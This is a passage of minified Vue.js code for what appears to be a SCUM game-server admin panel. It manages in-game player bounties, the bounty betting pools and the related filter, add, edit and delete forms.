e.$router.push({path:"/user",query:{userName:a.betHunterUser.userName}})}}},[e._v(e._s(a.betHunterUser?a.betHunterUser.userName:"-"))])]:e._e()]}},{key:"betAmount",fn:function(t){return[i("span",[e._v(e._s(t)+"美金")])]}},{key:"status",fn:function(t){return[e.bountyHunterTaskStatusBadgeKeyValue[t]?i("a-badge",{attrs:{status:e.bountyHunterTaskStatusBadgeKeyValue[t]}}):e._e(),i("span",[e._v(e._s(e.bountyHunterTaskStatusEnum[t]))])]}},{key:"createdTimeStamp",fn:function(t){return[i("span",[e._v(e._s(e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss")))])]}}],null,!1,2387690087)}),i("a-pagination",{staticStyle:{"margin-top":"10px"},attrs:{"show-size-changer":"","page-size":e.currentBountyHunterGambling.bountyHunterGamblingListPagination.pageSize,current:e.currentBountyHunterGambling.bountyHunterGamblingListPagination.pageNum,total:e.currentBountyHunterGambling.bountyHunterGamblingListPagination.total},on:{change:e.onChangeBountyHunterGamblingListPagination,showSizeChange:e.onShowSizeChangeBountyHunterGamblingListPagination}})],1),i("Loading",{attrs:{tip:"正在加载",show:e.currentBountyHunterGambling.loading}})],1):e._e()],2)],1)}),[],!1,null,"776f8c02",null).exports},computed:Object(s.a)({},Object(v.mapState)(["bountyHunterInfo","userInfo"])),data:function(){return{moment:R.a,bountyHunterStatusEnum:{free:"空闲",received:"已接单",completed:"已完成",cancelled:"已取消"},bountyHunterStatusBadgeKeyValue:{free:"default",received:"processing",completed:"success",cancelled:"error"},loadingBountyHunterListTable:!1,bountyHunterListFilter:{releaseUserName:void 0,preySteamId:void 0,currentHunterUserName:void 0,status:void 0,timestampStart:void 0,timestampEnd:void 0},bountyHunterSettings:{},bountyHunterListColumns:[{title:"ID",key:"id",dataIndex:"id",width:200,align:"center",scopedSlots:{customRender:"id"}},{title:"任务发布人",key:"releaseName",dataIndex:"releaseName",width:180,align:"center",scopedSlots:{customRender:"releaseName"}},{title:"猎物",key:"preyScumName",dataIndex:"preyScumName",width:180,align:"center",scopedSlots:{customRender:"preyScumName"}},{title:"悬赏金池",key:"bounty",dataIndex:"bounty",width:150,align:"center",scopedSlots:{customRender:"bounty"}},{title:"竞猜奖池",key:"gamblingPrizePool",dataIndex:"gamblingPrizePool",width:180,align:"center",scopedSlots:{customRender:"gamblingPrizePool"}},{title:"任务状态",key:"status",dataIndex:"status",width:80,align:"center",scopedSlots:{customRender:"status"}},{title:"当前猎人",key:"currentHunterUserName",dataIndex:"currentHunterUserName",width:100,align:"center",scopedSlots:{customRender:"currentHunterUserName"}},{title:"创建时间",key:"createdTimeStamp",dataIndex:"createdTimeStamp",width:120,align:"center",scopedSlots:{customRender:"createdTimeStamp"}}],bountyHunterListData:[],bountyHunterListPagination:{pageSize:20,pageNum:1,total:0},expandedBountyHunterIds:[],addBountyHunterModal:!1,addBountyHunterLoading:!1,addBountyHunterForm:{releaseUserId:void 0,preySteamId:void 0,taskExcludeSteamIds:[],taskIncludeSteamIds:[],bounty:void 0},addBountyHunterFormRules:{releaseUserId:[{required:!0,trigger:"change",message:"发布玩家为空",validator:function(e,t,i){"number"==typeof t&&t>=0?i():i(new Error("发布玩家为空"))}}],preySteamId:[{required:!0,trigger:"change",message:"被悬赏玩家为空",validator:function(e,t,i){t&&t.length>=0?i():i(new Error("被悬赏玩家为空"))}}],bounty:[{required:!0,trigger:"change",message:"赏金为空",validator:function(e,t,i){"number"==typeof t&&t>=0?i():i(new Error("赏金为空"))}}]},releaseUserIdList:[],preySteamIdList:[],taskExcludeSteamIdList:[],taskIncludeSteamIdList:[]}},mounted:function(){this.getBountyHunterList(),this.getBountyHunterSettings()},methods:{onBountyHunterListCleanFilter:function(){var e=this;this.bountyHunterListPagination.pageNum=1,this.$nextTick((function(){e.getBountyHunterList()}))},onBountyHunterListFilter:function(){var e=this;this.bountyHunterListPagination.pageNum=1,this.$nextTick((function(){e.getBountyHunterList()}))},onChangeBountyHunterListPagination:function(e){var t=this;this.bountyHunterListPagination.pageNum=e,this.$nextTick((function(){t.getBountyHunterList()}))},onShowSizeChangeBountyHunterListPagination:function(e,t){var i=this;this.bountyHunterListPagination.pageNum=1,this.bountyHunterListPagination.pageSize=t,this.$nextTick((function(){i.getBountyHunterList()}))},getBountyHunterSettings:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,t.next=3,f({method:"GET",url:"/serverConfigAdminSys/bountyHunterSettings"});case 3:200===(i=t.sent).status&&e.$set(e,"bountyHunterSettings",i.data),t.next=11;break;case 7:t.prev=7,t.t0=t.catch(0),console.error(t.t0),e.loadingBountyHunterListTable=!1;case 11:case"end":return t.stop()}}),t,null,[[0,7]])})))()},getBountyHunterList:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a,n,r,o,l,c;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a=t.bountyHunterListPagination,n=a.pageNum,r=a.pageSize,e?(t.bountyHunterListFilter={releaseUserName:void 0,preySteamId:void 0,currentHunterUserName:void 0,status:void 0,timestampStart:void 0,timestampEnd:void 0},o={pageNum:n,pageSize:r}):(l=Object(A.cloneDeep)(t.bountyHunterListFilter),o=Object(s.a)({pageNum:n,pageSize:r},l)),t.loadingBountyHunterListTable=!0,i.prev=3,i.next=6,f({method:"GET",url:"/bountyHunterAdminSys/list",params:o});case 6:c=i.sent,t.loadingBountyHunterListTable=!1,200===c.status&&(t.bountyHunterListPagination.total=c.data.count,t.bountyHunterListData=c.data.list.map((function(e){return Object(s.a)(Object(s.a)({},e),{},{bountyEdit:e.bounty+0,gamblingPrizePoolEdit:e.gamblingPrizePool+0,taskExcludeSteamIdsEdit:Object(A.cloneDeep)(e.taskExcludeSteamIds),taskExcludeSteamIdListEdit:[],taskIncludeSteamIdsEdit:Object(A.cloneDeep)(e.taskIncludeSteamIds),taskIncludeSteamIdListEdit:[],editSaveLoading:!1,isEdit:!1})}))),i.next=15;break;case 11:i.prev=11,i.t0=i.catch(3),console.error(i.t0),t.loadingBountyHunterListTable=!1;case 15:case"end":return i.stop()}}),i,null,[[3,11]])})))()},deleteBountyHunter:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a={id:e},i.prev=1,i.next=4,f({method:"DELETE",url:"/bountyHunterAdminSys/delete",params:a});case 4:200===i.sent.status&&(t.$message.success("操作成功"),t.getBountyHunterList()),i.next=11;break;case 8:i.prev=8,i.t0=i.catch(1),console.error(i.t0);case 11:case"end":return i.stop()}}),i,null,[[1,8]])})))()},newBountyHunter:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:e.addBountyHunterModal=!0,e.$set(e,"addBountyHunterForm",{releaseUserId:void 0,preySteamId:void 0,taskExcludeSteamIds:[],taskIncludeSteamIds:[],bounty:void 0});case 2:case"end":return t.stop()}}),t)})))()},handleSearchReleaseUser:Object(A.debounce)(function(){var e=Object(o.a)(regeneratorRuntime.mark((function e(t){var i,a;return regeneratorRuntime.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return e.prev=0,i={keyword:t},e.next=4,f({method:"GET",url:"/userAdminSys/searchUsers",params:i});case 4:200===(a=e.sent).status&&(this.releaseUserIdList=a.data),e.next=11;break;case 8:e.prev=8,e.t0=e.catch(0),console.error(e.t0);case 11:case"end":return e.stop()}}),e,this,[[0,8]])})));return function(t){return e.apply(this,arguments)}}(),500),handleSearchPreySteamId:Object(A.debounce)(function(){var e=Object(o.a)(regeneratorRuntime.mark((function e(t){var i,a;return regeneratorRuntime.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return e.prev=0,i={keyword:t},e.next=4,f({method:"GET",url:"/userAdminSys/searchUserLogin",params:i});case 4:200===(a=e.sent).status&&(this.preySteamIdList=a.data),e.next=11;break;case 8:e.prev=8,e.t0=e.catch(0),console.error(e.t0);case 11:case"end":return e.stop()}}),e,this,[[0,8]])})));return function(t){return e.apply(this,arguments)}}(),500),handleSearchTaskExcludeSteamId:Object(A.debounce)(function(){var e=Object(o.a)(regeneratorRuntime.mark((function e(t){var i,a;return regeneratorRuntime.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return e.prev=0,i={keyword:t},e.next=4,f({method:"GET",url:"/userAdminSys/searchUserLogin",params:i});case 4:200===(a=e.sent).status&&(this.taskExcludeSteamIdList=a.data),e.next=11;break;case 8:e.prev=8,e.t0=e.catch(0),console.error(e.t0);case 11:case"end":return e.stop()}}),e,this,[[0,8]])})));return function(t){return e.apply(this,arguments)}}(),500),handleSearchTaskExcludeSteamIdEdit:Object(A.debounce)(function(){var e=Object(o.a)(regeneratorRuntime.mark((function e(t,i){var a,n;return regeneratorRuntime.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return e.prev=0,a={keyword:t},e.next=4,f({method:"GET",url:"/userAdminSys/searchUserLogin",params:a});case 4:200===(n=e.sent).status&&(i.taskExcludeSteamIdListEdit=n.data),e.next=11;break;case 8:e.prev=8,e.t0=e.catch(0),console.error(e.t0);case 11:case"end":return e.stop()}}),e,null,[[0,8]])})));return function(t,i){return e.apply(this,arguments)}}(),500),handleSearchTaskIncludeSteamId:Object(A.debounce)(function(){var e=Object(o.a)(regeneratorRuntime.mark((function e(t){var i,a;return regeneratorRuntime.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return e.prev=0,i={keyword:t},e.next=4,f({method:"GET",url:"/userAdminSys/searchUserLogin",params:i});case 4:200===(a=e.sent).status&&(this.taskIncludeSteamIdList=a.data),e.next=11;break;case 8:e.prev=8,e.t0=e.catch(0),console.error(e.t0);case 11:case"end":return e.stop()}}),e,this,[[0,8]])})));return function(t){return e.apply(this,arguments)}}(),500),handleSearchTaskIncludeSteamIdEdit:Object(A.debounce)(function(){var e=Object(o.a)(regeneratorRuntime.mark((function e(t,i){var a,n;return regeneratorRuntime.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return e.prev=0,a={keyword:t},e.next=4,f({method:"GET",url:"/userAdminSys/searchUserLogin",params:a});case 4:200===(n=e.sent).status&&(i.taskIncludeSteamIdListEdit=n.data),e.next=11;break;case 8:e.prev=8,e.t0=e.catch(0),console.error(e.t0);case 11:case"end":return e.stop()}}),e,null,[[0,8]])})));return function(t,i){return e.apply(this,arguments)}}(),500),submitAddBountyHunter:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:e.$refs.addBountyHunterForm.validate(function(){var t=Object(o.a)(regeneratorRuntime.mark((function t(i){var a,n,r,o,s,l,c,d;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:if(!i){t.next=16;break}return a=Object(A.cloneDeep)(e.addBountyHunterForm),n=a.releaseUserId,r=a.preySteamId,o=a.taskExcludeSteamIds,s=a.taskIncludeSteamIds,l=a.bounty,c={releaseUserId:n,preySteamId:r,taskExcludeSteamIds:o,taskIncludeSteamIds:s,bounty:l},e.addBountyHunterLoading=!0,t.prev=4,t.next=7,f({method:"POST",url:"/bountyHunterAdminSys/add",data:c});case 7:d=t.sent,e.addBountyHunterLoading=!1,200===d.status?(e.$message.success("添加成功"),e.addBountyHunterModal=!1,e.addBountyHunterForm={releaseUserId:void 0,preySteamId:void 0,taskExcludeSteamIds:[],taskIncludeSteamIds:[],bounty:void 0},e.getBountyHunterList()):(console.log("错误",d),e.$message.error(d.msg)),t.next=16;break;case 12:t.prev=12,t.t0=t.catch(4),console.error(t.t0),e.addBountyHunterLoading=!1;case 16:case"end":return t.stop()}}),t,null,[[4,12]])})));return function(e){return t.apply(this,arguments)}}());case 1:case"end":return t.stop()}}),t)})))()},submitSaveBountyHunter:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a,n;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return e.editSaveLoading=!0,a={id:e.id,bounty:e.bountyEdit,gamblingPrizePool:e.gamblingPrizePoolEdit,taskExcludeSteamIds:e.taskExcludeSteamIdsEdit,taskIncludeSteamIds:e.taskIncludeSteamIdsEdit},i.prev=2,i.next=5,f({method:"PUT",url:"/bountyHunterAdminSys/update",data:a});case 5:n=i.sent,e.editSaveLoading=!1,200===n.status?(t.$message.success("修改成功"),e.isEdit=!1,t.expandedBountyHunterIds=[],t.getBountyHunterList()):(console.log("错误",n),t.$message.error(n.msg)),i.next=14;break;case 10:i.prev=10,i.t0=i.catch(2),console.error(i.t0),e.editSaveLoading=!1;case 14:case"end":return i.stop()}}),i,null,[[2,10]])})))()},loadInitialTaskExcludeSteamIds:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a,n;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:if(e.taskExcludeSteamIdsEdit&&e.taskExcludeSteamIdsEdit.length){i.next=2;break}return i.abrupt("return");case 2:return a={keywords:e.taskExcludeSteamIdsEdit},i.prev=3,i.next=6,f({method:"GET",url:"/userAdminSys/searchUserLoginMulti",params:a});case 6:200===(n=i.sent).status?e.taskExcludeSteamIdListEdit=n.data:(console.log("错误",n),t.$message.error(n.msg)),i.next=13;break;case 10:i.prev=10,i.t0=i.catch(3),console.error(i.t0);case 13:case"end":return i.stop()}}),i,null,[[3,10]])})))()},loadInitialTaskIncludeSteamIds:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a,n;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:if(e.taskIncludeSteamIdsEdit&&e.taskIncludeSteamIdsEdit.length){i.next=2;break}return i.abrupt("return");case 2:return a={keywords:e.taskIncludeSteamIdsEdit},i.prev=3,i.next=6,f({method:"GET",url:"/userAdminSys/searchUserLoginMulti",params:a});case 6:200===(n=i.sent).status?e.taskIncludeSteamIdListEdit=n.data:(console.log("错误",n),t.$message.error(n.msg)),i.next=13;break;case 10:i.prev=10,i.t0=i.catch(3),console.error(i.t0);case 13:case"end":return i.stop()}}),i,null,[[3,10]])})))()}}},ma=Object(S.a)(pa,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"100%"}},[i("div",{staticStyle:{width:"100%",height:"calc(100% - 66px)",padding:"15px","padding-top":"0"}},[i("div",{staticStyle:{width:"100%",height:"100%",background:"white","overflow-y":"auto",padding:"10px"}},[i("a-collapse",{staticStyle:{background:"none"},attrs:{"default-active-key":"1",bordered:!1}},[i("a-collapse-panel",{key:"1",staticStyle:{border:"none"}},[i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"header"},slot:"header"},[i("span",[e._v("搜索过滤条件")]),!e.userInfo||"sysAdmin"!==e.userInfo.role&&"admin"!==e.userInfo.role?e._e():i("a-button",{staticStyle:{float:"right"},attrs:{size:"small",type:"primary",icon:"plus"},nativeOn:{click:function(t){return t.stopPropagation(),e.newBountyHunter.apply(null,arguments)}}},[e._v("发布悬赏")]),i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small",type:"primary",icon:"filter"},nativeOn:{click:function(t){return t.stopPropagation(),e.onBountyHunterListFilter.apply(null,arguments)}}},[e._v("过滤")]),i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small"},nativeOn:{click:function(t){return t.stopPropagation(),e.onBountyHunterListCleanFilter.apply(null,arguments)}}},[e._v("清空过滤 / 刷新")])],1),i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"80px","text-align":"right",display:"inline-block"}},[e._v("任务发布人:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.bountyHunterListFilter.releaseUserName,callback:function(t){e.$set(e.bountyHunterListFilter,"releaseUserName",t)},expression:"bountyHunterListFilter.releaseUserName"}}),i("div",{staticStyle:{width:"80px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("猎物Steam ID:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.bountyHunterListFilter.preySteamId,callback:function(t){e.$set(e.bountyHunterListFilter,"preySteamId",t)},expression:"bountyHunterListFilter.preySteamId"}}),i("div",{staticStyle:{width:"80px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("当前猎人:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.bountyHunterListFilter.currentHunterUserName,callback:function(t){e.$set(e.bountyHunterListFilter,"currentHunterUserName",t)},expression:"bountyHunterListFilter.currentHunterUserName"}})],1),i("div",{staticStyle:{"margin-top":"10px","overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"80px","text-align":"right",display:"inline-block"}},[e._v("活动状态:")]),i("a-select",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{allowClear:""},model:{value:e.bountyHunterListFilter.status,callback:function(t){e.$set(e.bountyHunterListFilter,"status",t)},expression:"bountyHunterListFilter.status"}},[i("a-select-option",{key:"free",attrs:{title:"空闲"}},[e._v("空闲")]),i("a-select-option",{key:"received",attrs:{title:"已接单"}},[e._v("已接单")]),i("a-select-option",{key:"completed",attrs:{title:"已完成"}},[e._v("已完成")]),i("a-select-option",{key:"cancelled",attrs:{title:"已取消"}},[e._v("已取消")])],1),i("div",{staticStyle:{width:"80px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("创建时间:")]),i("a-range-picker",{staticStyle:{width:"320px","margin-left":"10px"},attrs:{"show-time":{format:"HH:mm:ss"},format:"YYYY-MM-DD HH:mm:ss",value:[e.bountyHunterListFilter.timestampStart,e.bountyHunterListFilter.timestampEnd],allowClear:""},on:{change:function(t){e.$set(e.bountyHunterListFilter,"timestampStart",t[0]),e.$set(e.bountyHunterListFilter,"timestampEnd",t[1])}}})],1)])],1),i("a-modal",{attrs:{width:800,title:"新增悬赏","mask-closable":!1},model:{value:e.addBountyHunterModal,callback:function(t){e.addBountyHunterModal=t},expression:"addBountyHunterModal"}},[i("template",{slot:"footer"},[i("a-button",{on:{click:function(t){e.addBountyHunterModal=!1}}},[e._v("取消")]),i("a-button",{attrs:{type:"primary",loading:e.addBountyHunterLoading},on:{click:e.submitAddBountyHunter}},[e._v("提交")])],1),e.addBountyHunterModal?i("a-form-model",{ref:"addBountyHunterForm",attrs:{model:e.addBountyHunterForm,rules:e.addBountyHunterFormRules,"label-col":{span:6},"wrapper-col":{span:18}}},[i("a-form-model-item",{attrs:{prop:"releaseUserId",label:"发布玩家"}},[i("a-select",{staticStyle:{width:"100%"},attrs:{placeholder:"模糊搜索(名称或Steam ID)","allow-clear":"","show-search":"","filter-option":!1},on:{search:e.handleSearchReleaseUser},model:{value:e.addBountyHunterForm.releaseUserId,callback:function(t){e.$set(e.addBountyHunterForm,"releaseUserId",t)},expression:"addBountyHunterForm.releaseUserId"}},e._l(e.releaseUserIdList,(function(t){return i("a-select-option",{key:t.id,attrs:{label:t.userName}},[e._v(e._s(t.userName))])})),1)],1),i("a-form-model-item",{attrs:{prop:"preySteamId",label:"被悬赏玩家"}},[i("a-select",{staticStyle:{width:"100%"},attrs:{placeholder:"模糊搜索(Steam ID或游戏内ID)","allow-clear":"","show-search":"","filter-option":!1},on:{search:e.handleSearchPreySteamId},model:{value:e.addBountyHunterForm.preySteamId,callback:function(t){e.$set(e.addBountyHunterForm,"preySteamId",t)},expression:"addBountyHunterForm.preySteamId"}},e._l(e.preySteamIdList,(function(t){return i("a-select-option",{key:t.steamId,attrs:{label:t.scumId}},[e._v(e._s(t.scumId))])})),1)],1),i("a-form-model-item",{attrs:{prop:"taskExcludeSteamIds",label:"任务排除的玩家"}},[i("a-select",{staticStyle:{width:"100%"},attrs:{placeholder:"模糊搜索(Steam ID或游戏内ID)",mode:"multiple","allow-clear":"","show-search":"","filter-option":!1},on:{search:e.handleSearchTaskExcludeSteamId},model:{value:e.addBountyHunterForm.taskExcludeSteamIds,callback:function(t){e.$set(e.addBountyHunterForm,"taskExcludeSteamIds",t)},expression:"addBountyHunterForm.taskExcludeSteamIds"}},e._l(e.taskExcludeSteamIdList,(function(t){return i("a-select-option",{key:t.steamId,attrs:{label:t.scumId}},[e._v(e._s(t.scumId))])})),1)],1),i("a-form-model-item",{attrs:{prop:"taskIncludeSteamIds",label:"可以任务的特定玩家"}},[i("a-select",{staticStyle:{width:"100%"},attrs:{placeholder:"模糊搜索(Steam ID或游戏内ID)",mode:"multiple","allow-clear":"","show-search":"","filter-option":!1},on:{search:e.handleSearchTaskIncludeSteamId},model:{value:e.addBountyHunterForm.taskIncludeSteamIds,callback:function(t){e.$set(e.addBountyHunterForm,"taskIncludeSteamIds",t)},expression:"addBountyHunterForm.taskIncludeSteamIds"}},e._l(e.taskIncludeSteamIdList,(function(t){return i("a-select-option",{key:t.steamId,attrs:{label:t.scumId}},[e._v(e._s(t.scumId))])})),1)],1),i("a-form-model-item",{attrs:{prop:"bounty",label:"赏金",extra:"已设置最低赏金: "+(e.bountyHunterSettings&&e.bountyHunterSettings.BountyHunterMinBounty)}},[i("a-input-number",{staticStyle:{width:"100%"},attrs:{min:e.bountyHunterSettings&&e.bountyHunterSettings.BountyHunterMinBounty?e.bountyHunterSettings.BountyHunterMinBounty:0},model:{value:e.addBountyHunterForm.bounty,callback:function(t){e.$set(e.addBountyHunterForm,"bounty",t)},expression:"addBountyHunterForm.bounty"}})],1)],1):e._e()],2),i("a-table",{staticStyle:{"margin-top":"10px"},attrs:{columns:e.bountyHunterListColumns,"data-source":e.bountyHunterListData,expandedRowKeys:e.expandedBountyHunterIds,"row-key":"id",pagination:!1,loading:e.loadingBountyHunterListTable,bordered:"",scroll:{x:"100%"},size:"small"},on:{expand:function(t,i){if(t)void 0===e.expandedBountyHunterIds.find((function(e){return e===i.id}))&&e.expandedBountyHunterIds.push(i.id),e.loadInitialTaskExcludeSteamIds(i),e.loadInitialTaskIncludeSteamIds(i);else{var a=Object.keys(e.expandedBountyHunterIds).find((function(t){return e.expandedBountyHunterIds[t]===i.id}));void 0!==a&&e.expandedBountyHunterIds.splice(a,1)}}},scopedSlots:e._u([{key:"id",fn:function(t){return[i("span",[e._v(e._s(t))])]}},{key:"releaseName",fn:function(t,a){return[a.releaseUser?[i("span",{staticStyle:{color:"#1890ff",cursor:"pointer"},on:{click:function(){return e.$router.push({path:"/user",query:{userName:a.releaseUser.userName}})}}},[e._v(e._s(a.releaseUser?a.releaseUser.userName:a.releaseUserId))])]:e._e()]}},{key:"preyScumName",fn:function(t,a){return[a.preyPlayer?[i("span",{staticStyle:{color:"#1890ff"}},[e._v(e._s(a.preyPlayer?a.preyPlayer.scumId:a.preySteamId))])]:e._e()]}},{key:"bounty",fn:function(t){return[i("span",[e._v(e._s(t.toFixed(2))+"美金")])]}},{key:"gamblingPrizePool",fn:function(t){return[i("span",[e._v(e._s(t.toFixed(2))+"美金")])]}},{key:"status",fn:function(t){return[i("span",[e.bountyHunterStatusBadgeKeyValue[t]?i("a-badge",{attrs:{status:e.bountyHunterStatusBadgeKeyValue[t]}}):e._e(),i("span",[e._v(e._s(e.bountyHunterStatusEnum[t]))])],1)]}},{key:"currentHunterUserName",fn:function(t,a){return[[i("span",{style:{color:a.currentHunterUser?"#1890ff":"",cursor:a.currentHunterUser?"pointer":"default"},on:{click:function(){return!!a.currentHunterUser&&e.$router.push({path:"/user",query:{userName:a.currentHunterUser&&a.currentHunterUser.userName}})}}},[e._v(e._s(a.currentHunterUser?a.currentHunterUser.userName:a.currentHunterUserId?a.currentHunterUserId:"无"))])]]}},{key:"createdTimeStamp",fn:function(t){return[i("span",[e._v(e._s(t?e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}},{key:"expandedRowRender",fn:function(t){return i("div",{staticStyle:{margin:"0"}},[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[i("span",[e._v("悬赏操作")]),!e.userInfo||"sysAdmin"!==e.userInfo.role&&"admin"!==e.userInfo.role?e._e():i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{disabled:t.editSaveLoading,size:"small",icon:t.isEdit?"close":"edit",type:t.isEdit?"default":"primary"},on:{click:function(e){t.isEdit=!t.isEdit}}},[e._v(e._s(t.isEdit?"取消":"编辑"))]),e.userInfo&&("sysAdmin"===e.userInfo.role||"admin"===e.userInfo.role)&&t.isEdit?i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:"save",type:"primary"},on:{click:function(){return e.submitSaveBountyHunter(t)}}},[e._v("保存")]):e._e()],1)]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap","padding-left":"10px","margin-bottom":"5px"}},[i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block"}},[e._v("悬赏金池:")]),i("a-input",{staticStyle:{width:"300px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:"",disabled:!t.isEdit},model:{value:t.bountyEdit,callback:function(i){e.$set(t,"bountyEdit",i)},expression:"record.bountyEdit"}})],1),e._e(),i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap","padding-left":"10px","margin-bottom":"5px"}},[i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block"}},[e._v("任务排除的玩家:")]),i("a-select",{staticStyle:{width:"300px","margin-left":"10px"},attrs:{disabled:!t.isEdit,placeholder:"模糊搜索(Steam ID或游戏内ID)",mode:"multiple","allow-clear":"","show-search":"","filter-option":!1},on:{search:function(i){return e.handleSearchTaskExcludeSteamIdEdit(i,t)}},model:{value:t.taskExcludeSteamIdsEdit,callback:function(i){e.$set(t,"taskExcludeSteamIdsEdit",i)},expression:"record.taskExcludeSteamIdsEdit"}},e._l(t.taskExcludeSteamIdListEdit,(function(t){return i("a-select-option",{key:t.steamId,attrs:{label:t.scumId}},[e._v(e._s(t.scumId))])})),1),i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block"}},[e._v("任务排除的玩家:")]),i("a-select",{staticStyle:{width:"300px","margin-left":"10px"},attrs:{disabled:!t.isEdit,placeholder:"模糊搜索(Steam ID或游戏内ID)",mode:"multiple","allow-clear":"","show-search":"","filter-option":!1},on:{search:function(i){return e.handleSearchTaskIncludeSteamIdEdit(i,t)}},model:{value:t.taskIncludeSteamIdsEdit,callback:function(i){e.$set(t,"taskIncludeSteamIdsEdit",i)},expression:"record.taskIncludeSteamIdsEdit"}},e._l(t.taskIncludeSteamIdListEdit,(function(t){return i("a-select-option",{key:t.steamId,attrs:{label:t.scumId}},[e._v(e._s(t.scumId))])})),1)],1),i("div",{staticStyle:{"overflow-x":"auto",width:"100%","line-height":"30px",height:"30px","padding-left":"10px","margin-bottom":"5px"}},[!e.userInfo||"sysAdmin"!==e.userInfo.role&&"admin"!==e.userInfo.role?e._e():[i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block"}},[e._v("操作:")]),!e.userInfo||"sysAdmin"!==e.userInfo.role&&"admin"!==e.userInfo.role?e._e():i("a-popconfirm",{attrs:{placement:"right",title:"确定要删除悬赏吗(悬赏相关的猎人记录和竞猜记录将会被清空)"},on:{confirm:function(){return e.deleteBountyHunter(t.id)}}},[i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",type:"danger",icon:"delete"}},[e._v("删除悬赏")])],1)]],2),i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("悬赏详细信息")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),void 0!==e.expandedBountyHunterIds.find((function(e){return e===t.id}))?i("BountyHunterTableExpand",{attrs:{"bounty-hunter-id":t.id}}):e._e()],1)}}])}),i("a-pagination",{staticStyle:{"margin-top":"10px"},attrs:{"show-size-changer":"","page-size":e.bountyHunterListPagination.pageSize,current:e.bountyHunterListPagination.pageNum,total:e.bountyHunterListPagination.total},on:{change:e.onChangeBountyHunterListPagination,showSizeChange:e.onShowSizeChangeBountyHunterListPagination}})],1)])])}),[],!1,null,"0c53aa4a",null).exports,ga={name:"LiquidationTableExpand",components:{Loading:w},computed:Object(s.a)({},Object(v.mapState)(["userInfo"])),props:{liquidationData:{type:Object,default:function(){return{}}}},data:function(){return{moment:R.a,liquidationDollarStatusEnum:{success:"成功",failed:"失败"},liquidationDollarStatusBadgeKeyValue:{success:"success",failed:"error"},currentExpandKey:null,currentExpandedLiquidationId:"",currentLiquidationSqaud:{columns:[{title:"用户ID",key:"userId",dataIndex:"userId",width:200,align:"center",scopedSlots:{customRender:"userId"}},{title:"保证金",key:"dollar",dataIndex:"dollar",width:120,align:"center",scopedSlots:{customRender:"dollar"}},{title:"划扣状态",key:"status",dataIndex:"status",width:80,align:"center",scopedSlots:{customRender:"status"}}]},currentLiquidationKill:{loading:!1,columns:[{title:"击杀者",key:"killUser",dataIndex:"killUser",width:200,align:"center",scopedSlots:{customRender:"killUser"}},{title:"被击杀者",key:"victimUser",dataIndex:"victimUser",width:200,align:"center",s